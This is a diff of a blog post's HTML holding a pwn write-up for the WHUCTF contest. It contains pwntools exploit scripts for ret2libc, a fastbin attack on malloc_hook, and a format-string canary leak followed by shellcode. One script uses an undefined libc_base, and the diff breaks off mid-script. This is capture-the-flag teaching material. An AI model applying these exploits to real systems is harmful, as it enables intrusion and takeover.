@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="赛场http:&#x2F;&#x2F;iwhu.info&#x2F;  武大萌新赛（whu的萌新已经强大到这种地步了嘛 不过题目大部分还算基础，但还是有很多新姿势的。 pwnpwnpwn常规的ret2libc，给了lib版本 1234567891011121314151617181920212223242526from pwn import *context.log_level &#x3D; &#39;debug&#39;# io &#x3D; process(">
+    <meta name="description" content="赛场http:&#x2F;&#x2F;iwhu.info&#x2F;  武大萌新赛（whu的萌新已经强大到这种地步了嘛 不过题目大部分还算基础，但还是有很多新姿势的。 pwnpwnpwn常规的ret2libc，给了lib版本 from pwn import *  context.log_level &#x3D; &#39;debug&#39;  # io &#x3D; process(&quot;.&#x2F;pwn&quot;) io &#x3D; remote(">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WHUCTF(pwn)">
 <meta property="og:url" content="https://xidoo123.github.io/2020/05/29/WHUCTF/index.html">
 <meta property="og:site_name" content="Stay hungry">
-<meta property="og:description" content="赛场http:&#x2F;&#x2F;iwhu.info&#x2F;  武大萌新赛（whu的萌新已经强大到这种地步了嘛 不过题目大部分还算基础，但还是有很多新姿势的。 pwnpwnpwn常规的ret2libc，给了lib版本 1234567891011121314151617181920212223242526from pwn import *context.log_level &#x3D; &#39;debug&#39;# io &#x3D; process(">
+<meta property="og:description" content="赛场http:&#x2F;&#x2F;iwhu.info&#x2F;  武大萌新赛（whu的萌新已经强大到这种地步了嘛 不过题目大部分还算基础，但还是有很多新姿势的。 pwnpwnpwn常规的ret2libc，给了lib版本 from pwn import *  context.log_level &#x3D; &#39;debug&#39;  # io &#x3D; process(&quot;.&#x2F;pwn&quot;) io &#x3D; remote(">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/06/05/GtqD5RQKXskIujL.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/30/fUgqtGKPsBhcaYE.png">
@@ -151,15 +151,187 @@
     <p>赛场<a href="http://iwhu.info/" target="_blank" rel="noopener">http://iwhu.info/</a>  武大萌新赛（whu的萌新已经强大到这种地步了嘛</p>
 <p>不过题目大部分还算基础，但还是有很多新姿势的。</p>
 <h2 id="pwnpwnpwn"><a href="#pwnpwnpwn" class="headerlink" title="pwnpwnpwn"></a>pwnpwnpwn</h2><p>常规的ret2libc，给了lib版本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./pwn")</span></span><br><span class="line">io = remote(<span class="string">"218.197.154.9"</span> ,<span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span>+p32(<span class="number">0x804A020</span>+<span class="number">0x500</span>) + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x804843B</span>) </span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">1</span>)+ p32(elf.got[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"Ready?\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x8c</span>*<span class="string">'a'</span>+p32(sys_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(bin_sh)</span><br><span class="line">io.sendlineafter(<span class="string">"Ready?\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
 
+context.log_level = &#39;debug&#39;
+
+# io = process(&quot;./pwn&quot;)
+io = remote(&quot;218.197.154.9&quot; ,10004)
+
+elf = ELF(&quot;./pwn&quot;)
+libc = ELF(&quot;./libc-2.23.so&quot;)
+
+payload = 0x88*&#39;a&#39;+p32(0x804A020+0x500) + p32(elf.plt[&#39;write&#39;]) + p32(0x804843B) 
+
+payload += p32(1)+ p32(elf.got[&#39;write&#39;])
+
+io.sendlineafter(&quot;Ready?\n&quot;,payload)
+
+write_addr = u32(io.recv(4))
+libc_base = write_addr - libc.sym[&#39;write&#39;]
+print hex(libc_base)
+sys_addr = libc_base + libc.sym[&#39;system&#39;]
+bin_sh = libc_base + libc.search(&quot;/bin/sh&quot;).next()
+
+payload = 0x8c*&#39;a&#39;+p32(sys_addr) + &#39;a&#39;*4 + p32(bin_sh)
+io.sendlineafter(&quot;Ready?\n&quot;,payload)
+
+io.interactive()</code></pre>
 <blockquote>
 <p> WHUCTF{welc0me_t0_pwn_woRld}</p>
 </blockquote>
 <h2 id="FFF"><a href="#FFF" class="headerlink" title="FFF"></a>FFF</h2><p><code>delete</code>功能里明显可以<code>uaf</code>。不让改got，保护全开，估计得改<code>malloc_hook</code> ，本地调试的时候把<code>alsr</code> 关了，然后错位数据找不到，蠢死了艹。</p>
 <p>通过<code>unsorted bin</code> 泄露lib，然后<code>fastbin</code> 打到<code>malloc_hook</code>即可，数据错位得到<code>0x7f</code> ，请求<code>0x60</code> 即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># import pwn_framework as pf</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p  : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a,b : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t : p.recvrepeat(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># amd64 or x86</span></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"./pwn"</span></span><br><span class="line">ip = <span class="string">"218.197.154.9"</span></span><br><span class="line">port = <span class="number">10007</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span> <span class="keyword">if</span> len(sys.argv)==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> bps <span class="comment"># Break Points</span></span><br><span class="line"><span class="keyword">global</span> gds <span class="comment"># Gdb Debug Symbols</span></span><br><span class="line">bps = []</span><br><span class="line">gds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">remote_libc = <span class="string">"./libc-2.23.so"</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="comment"># io = process(filename,aslr=False)</span></span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # if LD_PRELOAD multiple libs, split with ':'</span></span><br><span class="line">    <span class="comment"># io = process(filename, env=&#123;'LD_PRELOAD': remote_libc&#125;) </span></span><br><span class="line">    <span class="comment">#libc = ELF(remote_libc)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    <span class="comment"># libc = elf.libc</span></span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mydebug</span><span class="params">(p, s=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_bstr</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">global</span> bps</span><br><span class="line">        b_str =<span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> break_point <span class="keyword">in</span> bps:</span><br><span class="line">            <span class="keyword">if</span> type(break_point) == int:</span><br><span class="line">                b_str += <span class="string">"b *%s\n"</span>%(hex(break_point))</span><br><span class="line">            <span class="keyword">elif</span> type(break_point) == str:</span><br><span class="line">                b_str += <span class="string">"b %s\n"</span>%(break_point)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pause(p, <span class="string">"[_get_bstr] unsupported break point type : "</span>+str(break_point))</span><br><span class="line">        <span class="keyword">return</span> b_str</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_gds_str</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">global</span> gds</span><br><span class="line">        res = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> gds:</span><br><span class="line">            val = gds[name]</span><br><span class="line">            <span class="keyword">if</span> type(name) != str:</span><br><span class="line">                pause(p, <span class="string">"[_get_gds_str] unsupported name type : "</span>+str(type(name)))</span><br><span class="line">            <span class="keyword">if</span> type(val) != int:</span><br><span class="line">                pause(p, <span class="string">"[_get_gds_str] unsupported val type : "</span>+str(type(val)))</span><br><span class="line">            res += <span class="string">"set $%s=%d\n"</span>%(name, gds[name])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> LOCAL:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, _get_bstr()+_get_gds_str()+s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pause</span><span class="params">(p, s = <span class="string">'pause'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        print(<span class="string">'pid: '</span> + str(p.pid))</span><br><span class="line">        <span class="keyword">return</span> raw_input(s)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> raw_input(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    sla(p, XXX, str(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(name, val)</span>:</span></span><br><span class="line">    log.info(name+<span class="string">" : "</span>+hex(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sla(io,<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sla(io,<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line">    sla(io,<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    sla(io,<span class="string">'index?'</span>,str(idx))</span><br><span class="line">    sla(io,<span class="string">'size?'</span>,str(size))</span><br><span class="line">    sn(io,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(io,<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    sla(io,<span class="string">'index?\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(io,<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    sla(io,<span class="string">'index?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">pause(io)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(rv(io,<span class="number">6</span>)+<span class="string">"\x00"</span>+<span class="string">'\x00'</span>) - <span class="number">0x68</span></span><br><span class="line">lg(<span class="string">"malloc_hook:"</span>,malloc_hook)</span><br><span class="line">lg(<span class="string">"libc:"</span>,libc_base)</span><br><span class="line">gadget = <span class="number">0x4526a</span> + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rax == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x30] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x50] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_chunk = libc_base + <span class="number">0x155555328b05</span> - <span class="number">0x155554f64000</span> - <span class="number">0x18</span></span><br><span class="line">print(hex(target_chunk))</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x60</span>,p64(target_chunk))</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(malloc_hook-target_chunk<span class="number">-0x10</span>) + p64(gadget)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#coding:utf-8
+from pwn import *
+# import pwn_framework as pf
+from time import sleep
+import sys
 
+global io
+ru = lambda p, x : p.recvuntil(x)
+sn = lambda p, x : p.send(x)
+rl = lambda p  : p.recvline()
+sl = lambda p, x : p.sendline(x)
+rv = lambda p, x : p.recv(numb = x)
+sa = lambda p, a,b : p.sendafter(a,b)
+sla = lambda p, a,b : p.sendlineafter(a,b)
+rr = lambda p, t : p.recvrepeat(t)
+
+# amd64 or x86
+context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, endian = &#39;little&#39;)
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+
+filename = &quot;./pwn&quot;
+ip = &quot;218.197.154.9&quot;
+port = 10007
+
+LOCAL = True if len(sys.argv)==1 else False
+
+global bps # Break Points
+global gds # Gdb Debug Symbols
+bps = []
+gds = {}
+
+elf = ELF(filename)
+
+remote_libc = &quot;./libc-2.23.so&quot;
+if LOCAL:
+    io = process(filename)
+    # io = process(filename,aslr=False)
+    libc = elf.libc
+
+    # # if LD_PRELOAD multiple libs, split with &#39;:&#39;
+    # io = process(filename, env={&#39;LD_PRELOAD&#39;: remote_libc}) 
+    #libc = ELF(remote_libc)
+else:
+    context.log_level = &#39;debug&#39;
+    io = remote(ip, port)
+    # libc = elf.libc
+    libc = ELF(remote_libc)
+
+def mydebug(p, s=&#39;&#39;):
+    def _get_bstr():
+        global bps
+        b_str =&quot;&quot;
+        for break_point in bps:
+            if type(break_point) == int:
+                b_str += &quot;b *%s\n&quot;%(hex(break_point))
+            elif type(break_point) == str:
+                b_str += &quot;b %s\n&quot;%(break_point)
+            else:
+                pause(p, &quot;[_get_bstr] unsupported break point type : &quot;+str(break_point))
+        return b_str
+    def _get_gds_str():
+        global gds
+        res = &quot;&quot;
+        for name in gds:
+            val = gds[name]
+            if type(name) != str:
+                pause(p, &quot;[_get_gds_str] unsupported name type : &quot;+str(type(name)))
+            if type(val) != int:
+                pause(p, &quot;[_get_gds_str] unsupported val type : &quot;+str(type(val)))
+            res += &quot;set $%s=%d\n&quot;%(name, gds[name])
+        return res
+    if not LOCAL:
+        return
+    gdb.attach(p, _get_bstr()+_get_gds_str()+s)
+
+def pause(p, s = &#39;pause&#39;):
+    if LOCAL:
+        print(&#39;pid: &#39; + str(p.pid))
+        return raw_input(s)
+    else:
+        return raw_input(s)
+
+def choice(p, idx):
+    sla(p, XXX, str(idx))
+
+def lg(name, val):
+    log.info(name+&quot; : &quot;+hex(val))
+
+def add(size):
+    sla(io,&quot;&gt; &quot;,&quot;1&quot;)
+    sla(io,&#39;size?&#39;,str(size))
+
+def edit(idx,size,con):
+    sla(io,&quot;&gt; &quot;,&quot;2&quot;)
+    sla(io,&#39;index?&#39;,str(idx))
+    sla(io,&#39;size?&#39;,str(size))
+    sn(io,con)
+
+def show(idx):
+    sla(io,&quot;&gt; &quot;,&quot;3&quot;)
+    sla(io,&#39;index?\n&#39;,str(idx))
+
+def free(idx):
+    sla(io,&quot;&gt; &quot;,&quot;4&quot;)
+    sla(io,&#39;index?&#39;,str(idx))
+
+pause(io)
+
+add(0x100)#0
+add(0x60)#1
+free(0)
+show(0)
+
+malloc_hook = u64(rv(io,6)+&quot;\x00&quot;+&#39;\x00&#39;) - 0x68
+lg(&quot;malloc_hook:&quot;,malloc_hook)
+lg(&quot;libc:&quot;,libc_base)
+gadget = 0x4526a + libc_base
+
+# 0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   rax == NULL
+
+# 0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+# constraints:
+#   [rsp+0x30] == NULL
+
+# 0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+# constraints:
+#   [rsp+0x50] == NULL
+
+# 0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL
+
+
+target_chunk = libc_base + 0x155555328b05 - 0x155554f64000 - 0x18
+print(hex(target_chunk))
+add(0x20)#2
+free(1)
+edit(1,0x60,p64(target_chunk))
+add(0x60)#3
+add(0x60)#4
+
+payload = &#39;a&#39;*(malloc_hook-target_chunk-0x10) + p64(gadget)
+
+edit(4,len(payload),payload)
+add(0x8)
+
+io.interactive()</code></pre>
 <blockquote>
 <p>WHUCTF{FFFFFFFFFFFFFFastbin_Attack_5e58440652e52e354ae12af8775bec97}</p>
 </blockquote>
@@ -169,29 +341,193 @@
 <p><img src="https://i.loli.net/2020/06/05/GtqD5RQKXskIujL.png" alt=""></p>
 <p><img src="https://i.loli.net/2020/05/30/fUgqtGKPsBhcaYE.png" alt=""></p>
 <p>这题被官网write up误导了，read不会产生<code>\x00</code>输入截断，直接输入金丝雀就行。本地不知道为什么没打通，不过这题也没啥营养了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r=process(<span class="string">'./pwn'</span>,aslr = <span class="literal">False</span>)</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line">gdb.attach(r,<span class="string">"b *0x555555554B80"</span>)</span><br><span class="line"><span class="comment"># C01</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">(buf)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"choice&gt;&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"input data:\n"</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"input data:\n"</span>,buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span><span class="params">(string)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"choice&gt;&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"input data:\n"</span>,string)</span><br><span class="line"></span><br><span class="line">f3(<span class="string">".%p"</span>*<span class="number">10</span>+<span class="string">"."</span>)</span><br><span class="line"><span class="comment"># 6-ca7 -&gt; elf_base  10-240 __libc_start_main 8 -&gt; canary</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	r.recvuntil(<span class="string">"."</span>)</span><br><span class="line">elf_base = int(r.recvuntil(<span class="string">"."</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xca7</span></span><br><span class="line">r.recvuntil(<span class="string">"."</span>)</span><br><span class="line">canary = int(r.recvuntil(<span class="string">"0a."</span>,drop=<span class="literal">True</span>)+<span class="string">'00'</span>,<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">"."</span>)</span><br><span class="line">__libc_start_main = int(r.recvuntil(<span class="string">"."</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">"elf_base:"</span>+hex(elf_base))</span><br><span class="line">success(<span class="string">"libc_base"</span>+hex(libc_base))</span><br><span class="line">success(<span class="string">"canary:"</span>+hex(canary))</span><br><span class="line"></span><br><span class="line">f2(<span class="string">"b"</span>*<span class="number">0x38</span>+p64(canary)+p64(<span class="number">0x202520</span>+elf_base)+p64(<span class="number">0xC08</span>+elf_base))</span><br><span class="line"></span><br><span class="line">f3(asm(shellcraft.sh()))</span><br><span class="line">f2(<span class="string">"b"</span>*<span class="number">0x38</span>+p64(canary)+p64(<span class="number">0x202020</span>+elf_base)+p64(<span class="number">0x202060</span>+elf_base))</span><br><span class="line"><span class="comment"># 0x202060+elf_base</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
+context.log_level=&#39;debug&#39;
+r=process(&#39;./pwn&#39;,aslr = False)
+context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, endian = &#39;little&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+gdb.attach(r,&quot;b *0x555555554B80&quot;)
+# C01
+def f2(buf):
+    r.sendlineafter(&quot;choice&gt;&gt;&quot;,&#39;2&#39;)
+    r.sendlineafter(&quot;input data:\n&quot;,&#39;a&#39;*8)
+    r.sendlineafter(&quot;input data:\n&quot;,buf)
 
+def f3(string):
+    r.sendlineafter(&quot;choice&gt;&gt;&quot;,&#39;3&#39;)
+    r.sendlineafter(&quot;input data:\n&quot;,string)
+
+f3(&quot;.%p&quot;*10+&quot;.&quot;)
+# 6-ca7 -&gt; elf_base  10-240 __libc_start_main 8 -&gt; canary
+for i in range(6):
+    r.recvuntil(&quot;.&quot;)
+elf_base = int(r.recvuntil(&quot;.&quot;,drop=True),16) - 0xca7
+r.recvuntil(&quot;.&quot;)
+canary = int(r.recvuntil(&quot;0a.&quot;,drop=True)+&#39;00&#39;,16)
+r.recvuntil(&quot;.&quot;)
+__libc_start_main = int(r.recvuntil(&quot;.&quot;,drop=True),16) - 240
+libc_base = __libc_start_main - libc.sym[&#39;__libc_start_main&#39;]
+
+success(&quot;elf_base:&quot;+hex(elf_base))
+success(&quot;libc_base&quot;+hex(libc_base))
+success(&quot;canary:&quot;+hex(canary))
+
+f2(&quot;b&quot;*0x38+p64(canary)+p64(0x202520+elf_base)+p64(0xC08+elf_base))
+
+f3(asm(shellcraft.sh()))
